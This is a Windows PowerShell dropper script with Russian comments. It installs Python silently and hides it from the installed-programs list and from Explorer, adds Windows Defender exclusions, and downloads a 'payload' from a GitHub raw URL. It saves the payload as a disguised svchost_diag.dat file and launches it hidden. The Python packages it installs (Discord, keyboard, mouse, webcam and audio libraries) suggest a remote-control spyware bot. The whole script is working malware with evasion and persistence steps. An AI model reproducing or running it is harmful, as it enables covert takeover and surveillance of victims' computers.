$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

$logPath = "$env:TEMP\deploy.log"
function Log($msg) { "[$(Get-Date -Format 'HH:mm:ss')] $msg" | Out-File -Append -Encoding utf8 $logPath }

Log "=== deploy start ==="

$pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
$pyw    = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"

if (-not (Test-Path $pyPath)) {
    Log "Installing Python 3.11..."
    $wc = New-Object Net.WebClient
    $wc.DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", "$env:TEMP\py_setup.exe")
    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" -Wait
    Remove-Item "$env:TEMP\py_setup.exe" -Force -ErrorAction SilentlyContinue

    $junkFolder = "$env:USERPROFILE\Desktop\параметры"
    if (Test-Path $junkFolder) { Remove-Item $junkFolder -Recurse -Force }

    # Убрать из списка программ
    $ub1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $ub1 -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force
    $ub2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $ub2 -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    if (-not (Test-Path $pyPath)) { $pyPath = "python.exe"; $pyw = "pythonw.exe" }
    Log "Python installed: $pyPath"
}

$deps = @(
    "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
    "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
    "pycaw", "opencv-python", "pyaudio", "PyNaCl"
)
Log "Installing deps..."
& $pyPath -m pip install --upgrade pip -q 2>&1 | Out-Null
& $pyPath -m pip install @deps -q 2>&1 | Out-Null
Log "Deps done"

# Скрыть каталог Python
attrib +h +s "$env:LOCALAPPDATA\Programs\Python" | Out-Null

# Постоянная директория вместо TEMP (защита от Storage Sense, очистки временных файлов и Defender)
$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostics"
if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}
attrib +h +s $workDir | Out-Null

# Исключения Defender (если есть доступ)
Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "pythonw.exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue

# Скачать payload в постоянную папку
$botPath = "$workDir\svchost_diag.dat"
$repoUrl = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
Log "Downloading payload..."
try {
    $wc2 = New-Object Net.WebClient
    $wc2.DownloadFile($repoUrl, $botPath)
    Log "Payload saved: $botPath"
} catch {
    Log "Download failed, checking local copy..."
}

# Резервная копия
$backupPath = "$env:APPDATA\Microsoft\Windows\svchost_diag.dat"
if (Test-Path $botPath) {
    Copy-Item -Path $botPath -Destination $backupPath -Force -ErrorAction SilentlyContinue
} elseif (Test-Path $backupPath) {
    Copy-Item -Path $backupPath -Destination $botPath -Force -ErrorAction SilentlyContinue
}

# Запуск через pythonw.exe
$args = "-W ignore -c `"exec(open(r'$botPath', encoding='utf-8').read())`""
Start-Process -FilePath $pyw -ArgumentList $args -WindowStyle Hidden
Log "Bot launched via pythonw.exe from $botPath"
Log "=== deploy done ==="
